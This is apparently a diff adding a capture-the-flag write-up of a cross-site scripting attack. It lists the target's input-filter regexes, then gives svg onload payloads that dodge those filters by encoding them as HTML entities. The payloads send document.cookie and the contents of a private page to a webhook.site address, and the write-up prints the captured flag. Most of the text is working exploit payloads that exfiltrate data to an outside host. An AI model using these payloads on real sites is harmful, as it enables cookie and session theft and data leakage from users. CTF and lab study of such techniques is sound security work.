@@ -1,0 +1,31 @@
+Invalid input. Failed at /<[^\w<>]*[ \/]\w*/i
+Invalid input. Failed at /<(|\/|[^\/>][^>]+|\/[^>][^>]+)>/i
+
+- /<[^\w<>]*[ \/]\w*/i
+	</ ...
+- /<(|\/|[^\/>][^>]+|\/[^>][^>]+)>/i
+	</>, ...
+- /(\b)(on\S{5,8})(\s*)=|(<\s*)(\/*)script/im
+	onclick=, onerror=, <script ,</script ...
+- /["'\(\)\.:\-\+> `]/im
+	' ( ) . : - + > ` space
+
+<svg> with onload
+
+<svg/onload=document.location="https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e/?cookie="+document.cookie;//<
+
+. violates
+
+Translate to HTML entities
+	<svg/onload=&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x77;&#x65;&#x62;&#x68;&#x6f;&#x6f;&#x6b;&#x2e;&#x73;&#x69;&#x74;&#x65;&#x2f;&#x63;&#x35;&#x63;&#x33;&#x62;&#x33;&#x31;&#x39;&#x2d;&#x62;&#x66;&#x36;&#x64;&#x2d;&#x34;&#x65;&#x34;&#x31;&#x2d;&#x61;&#x37;&#x35;&#x63;&#x2d;&#x62;&#x31;&#x63;&#x37;&#x65;&#x66;&#x38;&#x37;&#x36;&#x36;&#x35;&#x65;&#x2f;&#x3f;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x22;&#x2b;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x3b;//<
+
+Success, but no flag in cookie
+
+But referrer: http://127.0.0.1:1234/index.php?page=post&id=3
+
+Try to fetch the page
+	fetch('/index.php?page=post&id=3').then(r=>{return r.text()}).then(t=>{fetch('https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e', {method:'POST',body:t})})
+
+
+<svg/onload=&#x66;&#x65;&#x74;&#x63;&#x68;&#x28;&#x27;&#x2f;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x2e;&#x70;&#x68;&#x70;&#x3f;&#x70;&#x61;&#x67;&#x65;&#x3d;&#x70;&#x6f;&#x73;&#x74;&#x26;&#x69;&#x64;&#x3d;&#x33;&#x27;&#x29;&#x2e;&#x74;&#x68;&#x65;&#x6e;&#x28;&#x72;&#x3d;&#x3e;&#x7b;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x72;&#x2e;&#x74;&#x65;&#x78;&#x74;&#x28;&#x29;&#x7d;&#x29;&#x2e;&#x74;&#x68;&#x65;&#x6e;&#x28;&#x74;&#x3d;&#x3e;&#x7b;&#x66;&#x65;&#x74;&#x63;&#x68;&#x28;&#x27;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x77;&#x65;&#x62;&#x68;&#x6f;&#x6f;&#x6b;&#x2e;&#x73;&#x69;&#x74;&#x65;&#x2f;&#x63;&#x35;&#x63;&#x33;&#x62;&#x33;&#x31;&#x39;&#x2d;&#x62;&#x66;&#x36;&#x64;&#x2d;&#x34;&#x65;&#x34;&#x31;&#x2d;&#x61;&#x37;&#x35;&#x63;&#x2d;&#x62;&#x31;&#x63;&#x37;&#x65;&#x66;&#x38;&#x37;&#x36;&#x36;&#x35;&#x65;&#x27;&#x2c;&#x20;&#x7b;&#x6d;&#x65;&#x74;&#x68;&#x6f;&#x64;&#x3a;&#x27;&#x50;&#x4f;&#x53;&#x54;&#x27;&#x2c;&#x62;&#x6f;&#x64;&#x79;&#x3a;&#x74;&#x7d;&#x29;&#x7d;&#x29;//<
+	CTF{3B3E64A81963B5E3FAC7DE0CE63966F03559DAF4B61753AADBFBA76855DB5E5A}  
